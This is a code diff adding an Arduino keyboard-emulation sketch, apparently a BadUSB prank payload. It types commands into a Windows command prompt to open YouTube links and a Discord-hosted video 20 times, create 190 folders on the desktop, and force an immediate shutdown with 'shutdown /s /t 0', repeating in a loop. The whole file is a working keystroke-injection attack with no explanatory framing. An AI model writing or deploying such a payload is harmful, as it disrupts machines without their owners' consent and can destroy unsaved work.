@@ -1,0 +1,94 @@
+#include <Keyboard.h>
+
+int sec = 1000;
+
+void openCMD(){
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(100);
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(100);
+  Keyboard.print("cmd");
+  delay(100);
+  enter();
+  delay(100);
+  Keyboard.print("@echo off");
+  delay(100);
+  enter();
+}
+
+void enter(){
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.release(KEY_RETURN);
+  delay(100);
+}
+
+void openLink(String link, int times){
+  openCMD();
+  delay(200);
+  for(int i = 0; i < times; i++){
+    Keyboard.print(" start ");
+    Keyboard.print(link);
+
+    if(i < times - 1){
+      Keyboard.print(" &&");
+    }
+  }
+  enter();
+  
+}
+
+void makeFolder(String folderName, int times){
+  openCMD();
+  delay(200);
+  Keyboard.print("cd Desktop");
+  enter();
+  for(int i = 0; i < times; i++){
+    Keyboard.print(" mkdir ");
+    Keyboard.print(folderName);
+    Keyboard.print(i);
+
+    if(i < times - 1){
+      Keyboard.print(" &&");
+    }
+  }
+  enter();
+  
+}
+
+void cmdCommand(String command){
+  openCMD();
+  Keyboard.print(command);
+  enter();
+}
+
+void setup() {
+  delay(5*sec);
+  Keyboard.begin();
+}
+
+void loop() {
+  openLink("https://youtu.be/kmDt967CcaE",1);
+  delay(2*sec);
+  openLink("https://youtu.be/6nkxWQKH4L8", 1);
+  delay(4*sec);
+  
+  openLink("https://cdn.discordapp.com/attachments/767864813585170433/799930598198083604/sus.mp4", 20); 
+
+  delay(5*sec);
+  
+  makeFolder("SUS",190);
+
+  delay(2*sec);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(100);
+  Keyboard.print("d");
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(100);
+
+  delay(3*sec);
+
+  cmdCommand("shutdown /s /t 0");
+  
+}
